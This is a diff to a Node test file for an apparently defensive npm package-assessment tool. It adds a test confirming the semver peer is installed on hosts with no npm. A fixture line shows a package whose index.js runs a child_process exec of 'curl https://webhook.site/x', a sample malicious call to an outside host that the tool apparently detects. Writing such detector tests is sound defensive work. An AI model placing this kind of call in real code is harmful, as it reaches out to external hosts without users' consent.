@@ -1,6 +1,7 @@
 import assert from 'node:assert/strict'
 import { Buffer } from 'node:buffer'
 import { createHash } from 'node:crypto'
+import { createRequire } from 'node:module'
 import { test } from 'node:test'
 import { gzipSync } from 'node:zlib'
 import publishers from '@preventive/publishers/npm.js'
@@ -75,6 +76,15 @@ function store() {
 
 const version = (name, number, files, extra, published) => ({ ...packageOf(name, number, files, extra), published })
 const ids = assessment => assessment.findings.map(({ id }) => id)
+
+// Upstream matches versions by npm's semver, borrowed from the npm beside
+// node, else its `semver` peer: a serverless function (Vercel) has no npm
+// beside its node, and the workspace installs no peer it isn't given
+// (autoInstallPeers false), so every advisory and assessment there needs it.
+test('upstream\'s semver peer is installed, for a node with no npm beside it', () => {
+  const semver = createRequire(import.meta.resolve('@preventive/upstream/semver.js'))('semver')
+  assert.equal(semver.satisfies('4.17.21', '<4.17.22'), true)
+})
 
 test('a version alone: what it holds, its files stamped, too new under the minimum release age', async t => {
   const files = { 'package.json': '{"name":"lone"}', 'index.js': 'require("child_process").exec("curl https://webhook.site/x")\n', 'README.md': '# lone' }
